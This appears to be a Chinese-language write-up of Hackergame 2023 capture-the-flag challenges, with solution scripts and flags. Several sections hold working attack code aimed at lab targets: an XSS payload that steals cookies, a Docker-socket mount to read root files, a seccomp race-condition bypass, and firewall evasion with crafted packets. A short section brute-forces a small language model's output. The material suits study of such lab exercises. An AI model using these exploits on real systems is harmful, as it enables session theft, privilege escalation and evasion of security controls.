# Hackergame 2023 Writeup

本篇题解的详细版本也将发表于 [我的博客](https://blog.gzti.me) （暂缺）

## Hackergame 启动

~~充值 648 即可获得 flag~~

请求参数在 url 参数中，可以改成 `?similarity=114514` 直接通过，之后就能成功启动 ~yuangame2023~ 了。

题外话，想当年做量子藏宝图的时候还不知道什么是旅行者。
现在已经是一个快要 58 级的旅行者了（划掉

**`flag{WElcom3-tO-HaCKeR94ME-@nd-ENjOY-h@cKIng-2Oz3}`**

## 猫咪小测

1. `12`：根据 [中国科学技术大学图书馆书目检索系统](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=6c546d744c485a626535313758422f2b7a47426c736b33785a614a66364b5831314a6e4f7a474d595364633d)，将鼠标放到 **馆藏地** 的图标上，可以知道应当在 12 层。

2. `23`：阅读论文 [Nuggets of Wisdom: Determining an Upper Limit on the Number Density of Chickens in the Universe](https://arxiv.org/pdf/2303.17626.pdf)，可知答案是 23。

3. `CONFIG_TCP_CONG_BBR`：搜索引擎搜索可得 [Increase Linux Internet speed with TCP BBR congestion control](https://www.cyberciti.biz/cloud-computing/increase-your-linux-server-internet-speed-with-tcp-bbr-congestion-control/)

4. `ECOOP`：搜索 PL 相关顶会，在 [知乎](https://zhuanlan.zhihu.com/p/45208498) 看到 “国际上编程语言有公认的四大顶会：PLDI、POPL、OOPSLA、ECOOP。”，逐个尝试。

**`flag{weLC0m3-to-aT73nd-TH3-Nek0-ExaM-2OZ3}`**
**`flag{RE4l-ma$73r-of-THE-nEKO-ex4M-!N-u5TC}`**

## 更深更暗

F12 查看 HTML，发现最下面存在 flag 字符串

**`flag{T1t@n_4e3d1ca5eb35f4c1b837e9bb7cbbd72e}`**

## 旅行照片 3.0

用一些比较意识流的线索：

金色奖牌：诺贝尔物理学奖，小柴昌俊，东京大学，梶田隆章，ICRR
脖子上挂牌：Statphys28，August 7th-11th, 2023
博物馆：东京国家博物馆，Students Free，Ueno Park，[东京全国梅酒节](https://umeshu-matsuri.jp/tokyostaff/)
Statphys28：August 10th，Banquet，安田讲堂
ボタン＆カフリンクス：粉色海报，熊猫
3D 广告：每小时，秋田犬

大概如此？我看其他人的 wp 都更详细，这里酒不展开了

**`flag{how_I_wi5h_i_COulD_w1N_A_Nobe1_pri23_ac8a3757d0}`**
**`flag{PluM_w1NE_1S_rEa1LY_EXpen5iVE_d553d0963e}`**
**`flag{Un7I1_W3_M337_A64iN_6oODByE_S3n1OR_1a850a6dab}`**

## 赛博井字棋

对于井字棋，存在后手必不败的策略，因此直接尝试是不可能的。
经过尝试可以发现，本题目的实现可以重复覆盖进行下棋，只要~~作弊~~覆盖对手的棋子，就能随便赢。

**`flag{I_can_eat_your_pieces_468d08ff03}`**

## 奶奶的睡前 flag 故事

由于有去年的一系列截图实现导致的安全问题存在，故猜测本题可以利用工具解答。

搜索 google，截图，CVE 等词语后，可以很容易找到 [acropalypse](https://acropalypse.app/)

选择 `custom` 设备，结合已知设备，输入 `2048x1080` 之后即可得到答案。

**`flag{sh1nj1ru_k0k0r0_4nata_m4h0}`**

## 组委会模拟器

~~不会有人手动点吧~~

F12 分析流量可以知道，服务器给出了一系列时间戳和信息，算好时间发送 `delete` 请求，等待结果就好。

```py
import requests
import re

cookies = {
    'session': '...'
}

s = requests.Session()

r = s.post('http://202.38.93.111:10021/api/getMessages', cookies=cookies)

msg = r.json()

to_read = msg['messages']

import time
import tqdm

pattern = re.compile(r'hack\[(.*)\]')
start = time.time()

for idx, m in tqdm.tqdm(enumerate(to_read)):
    nxt = float(m['delay'])
    if pattern.search(m['text']) is not None:

        while time.time() - start < nxt + 0.4:
            time.sleep(1)

        r = s.post('http://202.38.93.111:10021/api/deleteMessage',
                   cookies=cookies, json={'id': idx})

        if not r.json()['success']:
            print(r.json())
            break

r = s.post('http://202.38.93.111:10021/api/getflag', cookies=cookies)

r.json()
```

**`flag{Web_pr0gra_mm1ng_2d07d5f8fd_15fun}`**

## 虫

SSTV

**`flag{SSssTV_y0u_W4NNa_HaV3_4_trY}`**

## JSON ⊂ YAML?

1. 搜索可以得到 [What valid JSON files are not valid YAML 1.1 files?](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)

   构造用例：`{ "2": 12345e999 }` 即可满足条件一

2. 翻找 `ruamel.yaml` 的相关实现中所有可能存在 `raise` 的位置，可以找到一处有关于重复键值的 Exception，但是在问题一的尝试中，这一问题不会引发报错

   构造用例：`{ "2": 12345e999, "2": 12345e999 }` 即可满足条件二

**`flag{faf9facd7c9d64f74a4a746468400a50e4bbb0772a}`**
**`flag{b1c73f14d04db546b7e7e24cf1cc725205cc4b3808}`**

## Git? Git!

Git 的全部数据均压缩后存储在 `.git/objects` 中，因此可以直接解压缩后搜索 flag。

```py
import os
import zlib

path = "./ML-Course-Notes/.git/objects"

for (path, dirs, files) in os.walk(path):
    for file in files:
        name = os.path.join(path, file)
        for ignore in ["info", "pack"]:
            if ignore in name:
                continue

        with open(name, "rb") as f:
            try:
                data = zlib.decompress(f.read())
                if b"flag" in data:
                    print("[+]: " + name)
                    s = data.decode()
                    pos = s.find("flag")
                    print(s[pos:pos+50])
            except:
                print("Error: " + name)
                continue
```

**`flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t}`**

## HTTP 集邮册

1. 一次手滑多删除了一个空格后出现了有关于 HTTP 0.9 的无状态码报文：

   ```
   GET /HTTP/1.1\r\n
   \r\n
   ```

2. 状态码构造一览表：

   | 状态码 | 请求                | 特殊 Header                 |
   | :----: | :------------------ | :-------------------------- |
   |  100   | `GET / HTTP/1.1`    | `Expect: 100-continue`      |
   |  200   | `GET / HTTP/1.1`    | &nbsp;                      |
   |  206   | `GET / HTTP/1.1`    | `Range: bytes=0-1`          |
   |  304   | `GET / HTTP/1.1`    | `If-Modified-Since: ...`    |
   |  400   | `GET / HTTP/1.1`    | `Content-Length: -1010101`  |
   |  404   | `GET /404 HTTP/1.1` | &nbsp;                      |
   |  405   | `POST / HTTP/1.1`   | &nbsp;                      |
   |  412   | `GET / HTTP/1.1`    | `If-Match: "*"`             |
   |  413   | `GET / HTTP/1.1`    | `Content-Length: 104000000` |
   |  416   | `GET / HTTP/1.1`    | `Range: bytes=100000000-`   |
   |  501   | `GET / HTTP/1.1`    | `Transfer-Encoding: gzip`   |
   |  505   | `GET / HTTP/2`      | &nbsp;                      |

**`flag{stacking_up_http_status_codes_is_fun_7ef5b51ff4}`**
**`flag{congratu1ations you discovered someth1ng before http1.0}`**
**`flag{I think that when many such status codes are accumulated eeb164fb06 it becomes a lifetime}`**

## Docker for Everyone

Docker 是区分前后端的进程，使用 `docker` 命令是向 `socket` 发送请求，实际的执行和文件访问权限为 daemon 的所有者，本道题中也就是 root，因此可以通过挂载的方式读取 flag。

```sh
alpine:~$ docker run -it --rm -v /dev/shm/flag:/flag alpine sh
/ # ls
bin    etc    home   media  opt    root   sbin   sys    usr
dev    flag   lib    mnt    proc   run    srv    tmp    var
/ # cat flag
flag{u5e_r00t1ess_conta1ner_98d15a166b_plz!}
```

**`flag{u5e_r00t1ess_conta1ner_98d15a166b_plz!}`**

## 惜字如金 2.0

比去年要利用 coppersmith 解密的简单多了。

由于五行都只有一个字母缺失，可以尝试手动解题，找到这个很像是答案的解.jpg

```py
codes = [
    'nymeh1niwemflcir}echaet@',
    'a3g7}kidgojernoetlsup?h@',
    'ullw!f5soadrhwnrsnstnoeq', # f 之前补充一个
    'ctt{l-findiehaai{oveatas', # { 之前补充一个
    'tty9kxborszstguyd?!blm-p'  # g 之前补充一个
]

flag_seq = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]

result = []
cmap = []

for i in flag_seq:
    code = codes[i // 24]
    cmap.append(i // 24)
    result.append(code[i % 24])

print(cmap)
print(str(result).replace("'", ''))

"".join(result)
```

**`flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}`**

## 🪐 高频率星球

大概读懂文件内容的情况下，将出现的因为 `less` 存在控制字符序列全部替换删除，恢复原文件。

程序运行时的 `asciinema_restore.rec` 已经去除了 `less` 之前的内容。

```py
import os
import json

file = "./asciinema_restore.rec"

with open(file, "rb") as f:
    data = f.read()

data = data.split(b"\n")
res = []

syms = [
    b':\x1b[K',
    b'~\x1b[K',
    b'\r\x1b[K \x1b[KESC\x08\x08\x08ESC',
    b'\r\x1b[K',
    b'\x1b[7mflag.js\x1b[27m\x1b[K',
    b'\x1b[K[\x08[',
    b'\x1b[K~\x08~',
    b'\x1b[K6\x086',
    b'\x1b[7m(END)'
    b'\x1b[27m\x1b[K'
]

for line in data:
    try:
        ret = json.loads(line)
        ret = ret[2].encode()

        if b"\r\x1b[K \x1b[KESC\x08\x08" in ret and len(ret) <= 39:
            continue

        for i in syms:
            ret = ret.replace(i, b"")

        res.append(ret)
    except:
        pass

with open("res.js", "wb") as f:
    f.write(b"".join(res))

os.system("node res.js")
```

**`flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}`**

## 🪐 小型大语言模型星球

从第三题开始，分析可以知道要在给定了输出序列的情况下训练输入向量，需要进行一些模型的 hack，时间原因没继续做。

1. 第一问，讲道理：

    ```
    this story is about "you are smart", the boy's name is "you are smart", the girl called him:


    "you are smart".

    The boy was so happy to hear the story. He thanked the girl and said: "I will always remember this
    👏👏👏 flag1: flag{1-THINK-y0u-4Re-Re411y-RE@LLy-$Mart} 👏👏👏
    ```

2. 暴力，在本地运行起模型之后，对于少于 7 个字符的输入进行枚举，很快可以得到：

    ```
    d}


    accepted and gave him the gift.

    The man was so happy and he thanked the shopkeeper. He went home and enjoyed his new gift.
    🎉🎉🎉 flag2: flag{y0u-4re-4CCepTED-T0-CoN7INUE-THe-G@Me} 🎉🎉🎉
    ```

**`flag{1-THINK-y0u-4Re-Re411y-RE@LLy-$Mart}`**
**`flag{y0u-4re-4CCepTED-T0-CoN7INUE-THe-G@Me}`**

## 🪐 流式星球

~~MyGo 下载好了一直没看呜呜呜~~

在 `ipynb` 中一步一步尝试求解。首先对于可能的长度进行因式分解：

```py
import cv2
import numpy as np
from tqdm import tqdm
from itertools import combinations
import itertools
import math
from PIL import Image

length = 0
buffer = None
with open('./video.bin', 'rb') as f:
    buffer = np.fromfile(f, dtype=np.uint8)
    buffer = buffer.reshape(-1, 3)
    length = buffer.shape[0]

def prime_factor(num):
    original_num = num
    factors = []
    for i in range(2, int(math.sqrt(num)) + 1):
        while num % i == 0:
            factors.append(i)
            num //= i

    if num > 1:
        factors.append(num)

    result = np.prod(factors)

    if result != original_num:
        raise Exception('not prime factor: {}'.format(original_num))

    return factors


possible_factors = {}

# try to factorize the length
for i in range(100):
    fs = prime_factor(length + i)

    # must have at least 4 factors
    if len(fs) <= 3: continue

    possible_factors[length + i] = fs

def extract(real_len, width, height=998, write=True):
    img = buffer[:width * height].reshape((height, width, 3))
    print(img.shape)
    if write:
        cv2.imwrite(f'./img/{real_len}_{width}_{height}.png', img)
    else:
        return Image.fromarray(img)


def test():
    # take the first frame of the video in every possible factor
    # need to combine the factors to get the resolution
    for real_len in possible_factors.keys():
        fs = possible_factors[real_len]

        for count in range(1, len(fs)):
            for item in combinations(fs, count):
                width = np.prod(item)
                if width % 10 == 0 or width < 100 or width > 3000:
                    continue
                extract(real_len, width)

```

尝试提取一些后，根据输出对宽度进行增减测试，二分可以快速得到如下常量：

```py
frame_width = 427
frame_height = 759
file_len = 0
frame_size = frame_width * frame_height
frame_count = length // frame_size

for real_len in possible_factors.keys():
    if real_len % frame_width != 0 or real_len % frame_height != 0:
        continue

    print(real_len)
    file_len = real_len

file_len - length
```

之后提取：

```py
size = (frame_width, frame_height)

for i in range(frame_count):
    img = buffer[i * frame_size:(i + 1) * frame_size].reshape(
        (frame_height, frame_width, 3))
    cv2.imwrite(f'./img/{i}.png', img)
```

可以在图片中找到 flag 内容。

**`flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}`**

## 🪐 低带宽星球

1. 直接在线压缩都能得到

2. 第二问的尝试中目前得到的最好程度是手动绘制矢量图、导出为 `webp`，可以得到 `160B` 的成绩，此题正确解法请参考其他 writeup

**`flag{justfind_an_image_compressor_andgo!}`**

## Komm, süsser Flagge

### 我的 POST

想要抵抗 `--algo bm --string "POST"` 只需要将一个 HTTP 请求分块发送，使得无法对 `POST` 进行全文匹配即可。

```py
http_request = [
    " / HTTP/1.1",
    "Host: {}:{}".format(addr, port),
    "Content-Length: 100",
    "Content-Type: application/x-www-form-urlencoded",
    "",
    token
]

req = "\r\n".join(http_request)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, int(port)))

s.send(b"PO")
s.send(b"ST")

s.send(req.encode())

print(s.recv(1024).decode())
```

**`flag{ea5Y_sPl1tt3r_45dcf31181}`**

### 我的 P

这一问成功 Get 了非预期，对于 `-m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50"t`，由于会读取 4byte，于是第一问的解答可以继续使用。

### 我的 GET

对于如下的规则进行考量：

`-m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT`

不止是 TCP 包，全部流量包的前 50bytes 中均需要存在 `GET / HTTP` 字符串。最开始考虑使用固定值之间的空隙来存放，后续经过本地的抓包计算，空间不足，如果放在 TCP Options 中也可能导致超出 50bytes 的范围。

于是考虑向 IP 层添加信息，~~这道题卡住主要是因为不知道 scapy~~，后续知道了后，很快就成功实现。

又一个坑是操作系统可能会抢答 TCP 包，在它没有维护这个 socket 的时候，会尝试 RST，干扰我们的请求。因此需要使用本地 `iptables` 进行 `drop`。

```bash
sudo iptables -A INPUT -p tcp -s "192.168.23.1" --sport 18082 -j DROP
```

```py
from scapy.all import *

token = ""

ip = IP(
    dst="192.168.23.1",
    options=bytes([15, 12]) + b"GET / HTTP"
)

sport, dport = 61451, 18082

http_request = [
    "POST / HTTP/1.1",
    "Host: 192.168.23.1:18082",
    "Content-Length: 100",
    "Content-Type: application/x-www-form-urlencoded",
    "",
    token
]

data = "\r\n".join(http_request).encode()

seq = RandInt()

SYN = TCP(sport=sport, dport=dport, flags='S', seq=seq)

SYNACK = sr1(ip / SYN)
print(f"[+] SYNACK: seq={SYNACK.seq} ack={SYNACK.ack}")

ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)

send(ip / ACK)
print(f"[+] ACK sent: seq={ACK.seq} ack={ACK.ack}")

DATA = TCP(sport=sport, dport=dport, flags='PA', seq=SYNACK.ack, ack=SYNACK.seq + 1) / data
DATAACK = sr1(ip / DATA)

print(f"[+] DATAACK: seq={DATAACK.seq} ack={DATAACK.ack}")
```

在发送请求包的同时，给 OpenVPN 的虚拟网卡挂上 wireshark，就能获取到回复了。

当遇到流量不符合预期的时候最好的办法是重启 OpenVPN，~~别问我怎么知道的和卡了多久~~。

## 为什么要打开 /flag 😡

### LD_PRELOAD, love!

`LD_PRELOAD` 是 Linux 下的一个环境变量，可以用来指定动态链接库的加载路径，可以用来劫持函数调用。

因此我们只需要正确加载原有的 `libc.so.6` 中的函数进行使用即可。

```c
static FILE *(*real_real_fopen)(const char *restrict, const char *restrict) = NULL;

int main() {
    void *handle = dlopen("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
    real_real_fopen = dlsym(handle, "fopen");

    printf("ptr: %p\n", real_real_fopen);
    printf("pid: %d\n", getpid());

    // open flag and read
    FILE *fp = real_real_fopen("/flag", "r");

    char buf[0x100];
    fread(buf, 1, 0x100, fp);
    printf("%s\n", buf);

    return 0;
}
```

### 都是 seccomp 的错

本来没什么思路，水群时候看到有人发了一个截图，内容是来自 Rust 的 OS Error，这一截图让我确信了多线程在本题中是可行的。

因为在 `open` 系统调用中传递的为字符串指针，因此在 `seccomp` 中进行 syscall 数据拷贝的时候不会拷贝到字符串的内容，而是指针的值，因此可以通过多线程的方式来绕过 `seccomp` 的限制，进行条件竞争。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

void write_mem(char* addr, const char* str) {
    while (*str) {
        *addr = *str;
        addr++;
        str++;
    }
    *addr = '\0';
}

const char* temp = "/etc/passwd";
const char* flag = "/flag";

int main()
{
    // create shared memory with mmap
    char *shared_memory = mmap(NULL, 512, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);

    write_mem(shared_memory, temp);

    int child_count = 0;

    while (child_count < 10)
    {
        // fork
        int pid = fork();
        if (pid == -1)
        {
            perror("fork");
            exit(1);
        }

        if (pid == 0)
        {
            for(int i = 0; i < 10000; i++)
            {
                write_mem(shared_memory, flag);
                // sleep for a while
                for (int j = 0; j < 100; j++)
                {
                    asm("nop");
                }

                write_mem(shared_memory, temp);
                // sleep for a while
                for (int j = 0; j < 100; j++)
                {
                    asm("nop");
                }
            }

            exit(0);
        }
        else
        {
            child_count++;
        }
    }

    // print the flag
    for (int i = 0; i < 10000; i++)
    {
        FILE *fp = fopen(shared_memory, "r");
        if (fp == NULL)
        {
            perror("fopen");
            continue;
        }

        char buf[512];
        fread(buf, 1, 512, fp);
        if (buf[0] == 'f')
        {
            printf("flag: %s\n", buf);
            exit(0);
        }
        fclose(fp);
    }

    return 0;
}
```

**`flag{rEAd_seccomp_unotify(2)_mAnpAgE_7e49dc2ad3_t0ct0u}`**

## 异星歧途

打开游戏，把玩一会，可以在右下角看到本游戏支持“逻辑处理器”这种东西。

**第一部分：**

```log
sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 0 0 0
end
control enabled generator1 0 0 0 0
end
```

直接可以读出来：`01011010`

**第二部分：**

```log
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 0 0 0
control enabled panel1 en 0 0 0
end
```

简单反汇编：

```log
jump 33 greaterThanEq i 16      # if i >= 16 goto 33
op pow fl0 i 2                  # fl0 = i^2
jump 31 notEqual fl0 number     # if fl0 != number goto 31
set en 1                        # en = 1
jump 33 always x false          # goto 33
op add i i 1                    # i++
jump 26 always x false          # goto 26
op equal fl1 0 sw1              # fl1 = sw1 == 0
op equal fl2 0 sw6              # fl2 = sw6 == 0
op or fl3 fl1 fl2               # fl3 = fl1 || fl2
jump 38 equal fl3 0             # if fl3 == 0 goto 38
set en 0                        # en = 0
```

- `fl3 != 0` => `sw1 == 1 || sw6 == 1`
- `number is ? ** 2`

```py
for i in range(16):
    bits = bin(i ** 2)[2:].zfill(8)
    if bits[0] == '1' and bits[5] == '1':
        print(i**2, bits)
```

直接可以得到：`11000100`

**第三部分：**

```log
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 0 0 0     # sw1 <- ?
control enabled gate1 sw2 0 0 0         # sw2 <- 0
op equal nsw3 sw3 0                     # nsw3 = sw3 == 0 (not sw3)
control enabled reactor1 nsw3 0 0 0
control enabled reactor2 nsw3 0 0 0
control enabled conduit1 sw4 0 0 0      # sw4 <- 0
control enabled conduit2 sw4 0 0 0
control enabled mixer1 sw5 0 0 0        # sw5 <- 1
control enabled extractor1 sw6 0 0 0    # sw6 <- 1
control enabled meltdown1 sw7 0 0 0     # sw7 <- 0
control enabled meltdown2 sw7 0 0 0
op equal result sw8 sw9                 # result = sw8 == sw9
jump 28 equal result true               # if result == true goto 28
control enabled mixer1 0 0 0 0
control enabled conduit2 1 0 0 0
control enabled reactor1 1 0 0 0
control enabled reactor2 1 0 0 0
control enabled conveyor2 1 0 0 0
wait 5
end
```

需要分析一下游戏逻辑，有反应堆肯定有冷却液体，那么肯定需要先保证冷却液的制造、管道没有泄漏，之后发现 `meltdown` 会大量消耗电力，不应该启动。

因此结合这些条件，可以得到 `10001100`，大概也就炸了几次吧（逃

**第四部分：**

尝试进行游戏内部把玩，可以得到 `01110111`

最终结果就是 **10100101110001001000110001110111**

**`flag{B34WarE_0f_#xp1osi0N_d894cdf5db}`**

## 微积分计算小练习 2.0

卡了很久，尝试了各种 `location`、`location["hash"]`、`origin` 等 `window` 对象的属性，由于存在 `escape` 都没有成功进行 HTML 注入。

之后根据 `popup` 找到了有关 `window.open` 的文档和 `window.name` 属性的解释 [target](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#target)，提到了：

> A string, without whitespace, specifying the name of the browsing context the resource is being loaded into.

因此 XSS 链条就可以构成，通过给 comment 提交 `"+name+"` 来初始化页面后，利用：

```html
<!DOCTYPE html>
<html>
<head>
    <title>Test</title>
</head>
<body>
    <script>
        var result = new URL("http://web/result");
        var payload = `<img src onerror=([{a:document.getElementsByClassName('form-control')[0].value=window.btoa(document.cookie.slice(0,16))},{b:document.getElementsByClassName('btn')[0].click()}])>`;
        window.open(result.href, 'Hello!</p>' + payload);
    </script>
</body>
</html>
```

进行注入和对 flag 的切片获取：

```log
"ZmxhZz1mbGFnJTdCeDU1Xw=="
"c3RpbGxfYWxpdmUlMjYlMw=="
"RCUzRV8lM0MrXzcwYjczMA=="
"MjFkMSU3RA=="

"flag=flag{x55_still_alive&=>_< _70b73021d1}"
```

**`flag{x55_still_alive&=>_< _70b73021d1}`**

## 逆向工程不需要 F5

逆向工程需要毅力和耐心。

在手动提取并阅读了 420+ 行汇编后就可以解出来了。

以其中一部分举例：

```s
mov     [rsp+1D8h+k], 0
cmp     [rsp+1D8h+k], 4         // for (k = 0; k < 4)
jge     loc_140001271
mov     [rsp+1D8h+m], 0
cmp     [rsp+1D8h+m], 8
jge     short loc_140001260     // for (m = 0; m < 8)
lea     r14, [rsp+1D8h+k]       // r14 = &k
lea     r13, [rsp+1D8h+ret_3]   // r13 = &ret_3

<!-- call    sub_140001550 -->

mov     rdx, r13                // rdx = &ret_3
mov     r14d, [r14]             // r14 = k
mov     r15d, 2                 // r15 = 2

<!-- mov     rcx, cs:lib10_18cc -->
<!-- call    rcx ; lib10_18cc -->

// lib10

push    rcx
mov     rcx, r15                // rcx = 2
mov     r9, r14                 // r9 = k
shl     r9, cl                  // r9 = k << 2
pop     rcx

// sub_140001550

mov     r14d, 0DEADBEEFh        // r14 = 0xDEADBEEF
mov     r15d, r9d               // r15 = r9 = k << 2

<!-- mov     rcx, cs:lib13_90ea -->
<!-- call    rcx ; lib13_90ea -->

// lib13

mov     r9, r14                 // r9 = 0xDEADBEEF
xor     r9, r15                 // r9 = 0xDEADBEEF ^ (k << 2)

mov     [rdx], r9               // ret_3 = 0xDEADBEEF ^ (k << 2)
<!-- jmp     short loc_14000155E -->
<!-- retn -->

mov     r13, [rsp+1D8h+ret_3] // r13 = ret_3

lea     r10, [rsp+1D8h+pos]
lea     r14, [rsp+1D8h+m]
lea     r15, [rsp+1D8h+ret_4]
lea     rcx, [rsp+1D8h+ret_5]
lea     rdx, [rsp+1D8h+ret_6]

<!-- mov     rax, cs:lib02 -->
<!-- call    rax ; lib02 -->
// lib2

mov     [r15], r13d             // ret_4 = ret_3
mov     rsi, [r10]              // rsi = pos
mov     [rcx], rsi              // ret_5 = [r10] = pos
movsxd  rsi, dword ptr [r14]    // rsi = m
mov     [rdx], rsi              // ret_6 = [r14] = m


// main

mov     r13d, [rsp+1D8h+ret_4]  // r13 = ret_4 = ret_3
mov     r14, [rsp+1D8h+ret_5]   // r14 = ret_5 = pos
mov     r15, [rsp+1D8h+ret_6]   // r15 = ret_6 = m

<!-- mov     rax, cs:lib09 -->
<!-- call    rax ; lib09 -->

// lib09

imul    r13d, [r14+r15*4]       // r13 = ret_3 * pos[m(*4)]
mov     [r14+r15*4], r13d       // pos[m] = ret_3 * pos[m(*4)]

// main

// lea     r14, [rsp+1D8h+m]
// call    sub_1400015A0        -> lib12 -> m++

// lea     rdx, [rsp+1D8h+k]
// call    sub_1400015D0        -> lib12 -> k++
```

上述汇编描述了：

```py
def stage2(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            flag[m] = (flag[m] * a) & 0xffffffff
    ret = int32_to_bytes(flag)
    print(ret.hex())
    return ret
```

最后得到的正向代码：

```py
def stage0(flag):
    # guess this is int128
    num = 0x55AA00FF
    mask = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    flag = bytes_to_int128(flag)
    for n in range(4):
        for m in range(2):
            a = num ^ (n << 4)
            flag[m] = (flag[m] * a) & mask
    ret = int128_to_bytes(flag)
    print(ret.hex())
    return ret

def stage1(flag):
    # xor by 0x7a026655fd263677, qword
    num = 0x7a026655fd263677
    flag = bytes_to_int64(flag)
    for j in range(4):
        flag[j] ^= num
    ret = int64_to_bytes(flag)
    print(ret.hex())
    return ret

def stage2(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            flag[m] = (flag[m] * a) & 0xffffffff
    ret = int32_to_bytes(flag)
    print(ret.hex())
    return ret

def stage3(flag):
    # xor by 0xcdec, word
    num = 0xcdec
    flag = bytes_to_int16(flag)
    for m in range(16):
        flag[m] ^= num
    ret = int16_to_bytes(flag)
    print(ret.hex())
    return ret

def stage4(flag):
    # xor by byte
    flag = [i for i in flag]
    for j in range(4):
        for k in range(32):
            m = 0x21 ^ (j << 1)
            flag[k] = (flag[k] * m) & 0xff
    ret = bytes(flag)
    print(ret.hex())
    return ret
```

于是进行逆向程序编写：

```py
def stage4_rev(flag):
    # xor by byte
    flag = [i for i in flag]
    for j in range(4):
        for k in range(32):
            m = 0x21 ^ (j << 1)
            inverse_m = inverse(m, 256)
            flag[k] = (flag[k] * inverse_m) & 0xff
    ret = bytes(flag)
    print("s4:", ret.hex())
    return bytes(flag)

def stage3_rev(flag):
    # xor by 0xcdec, word
    num = 0xcdec
    flag = bytes_to_int16(flag)

    for m in range(16):
        flag[m] ^= num

    ret = int16_to_bytes(flag)
    print("s3:", ret.hex())
    return ret

def stage2_rev(flag):
    # xor by 0xdeadbeef, dword
    num = 0xdeadbeef
    flag = bytes_to_int32(flag)
    for k in range(4):
        a = num ^ (k << 2)
        for m in range(8):
            inverse_k = inverse(a, 2 ** 32)
            flag[m] = (flag[m] * inverse_k) & 0xffffffff
    ret = int32_to_bytes(flag)
    print("s2:", ret.hex())
    return ret

# just xor
stage1_rev = stage1

def stage0_rev(flag):
    num = 0x55AA00FF
    mask = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    flag = bytes_to_int128(flag)
    for n in range(4):
        for m in range(2):
            a = num ^ (n << 4)
            inverse_a = inverse(a, 2 ** 128)
            flag[m] = (flag[m] * inverse_a) & mask
    ret = int128_to_bytes(flag)
    print(ret.hex())
    return ret

hackergame = '7F 02 57 CD 9F D9 34 92  1A 1F 24 12 AE C5 E7 42' \
             'AF AB 40 CC 36 D5 E9 05  AB 0C A8 EB 96 41 A7 AC'
hackergame = bytes.fromhex(hackergame.replace(' ', ''))

ret = hackergame
ret = stage4_rev(ret)
ret = stage3_rev(ret)
ret = stage2_rev(ret)
ret = stage1_rev(ret)
ret = stage0_rev(ret)

print(f"flag:{{{ret.decode()}}}")
```

**`flag{DECoMp!!ER_15_nOT_@Lways_Enough~}`**

## O(1) 用户登录系统

很坑的一道题，跳出思维陷阱的时间大概是 2 天。

核心目标为构建一个可以被 `.decode("utf-8")` 的含有 `:` 的字符串，且让它作为一棵叶子节点存在 `admin:xxxx` 的树的根。

```py
from hashlib import sha1
from pwn import *

def solve(target=b'admin:11451'):
    target = sha1(b'admin:11451').digest()
    padding = b'11451' * 4
    nxt = target
    current = target

    while True:
        # avoid '\n' but need ':'
        if 0x3a in nxt and 0x0a not in nxt:
            try:
                nxt.decode()

                # result can be put into the "user:pass" format
                # construct the chain to this
                return nxt + padding, [current, padding]

            except:
                pass

        current = nxt
        if current > target:
            nxt = sha1(target + current).digest()
        else:
            nxt = sha1(current + target).digest()


user, padding = solve()

padding = ''.join([p.hex() for p in padding])

sh = remote('202.38.93.111', 10094)

sh.sendlineafter(b'token: \n', token)

sh.sendlineafter(b'Choice: ', b'1')

other = b'1:1'

sh.sendlineafter(b'> ', other)
sh.sendlineafter(b'> ', user)
sh.sendlineafter(b'> ', b'EOF')

log.info(f'user: {user}')

credential = 'admin:11451:' + padding + sha1(other).hexdigest()
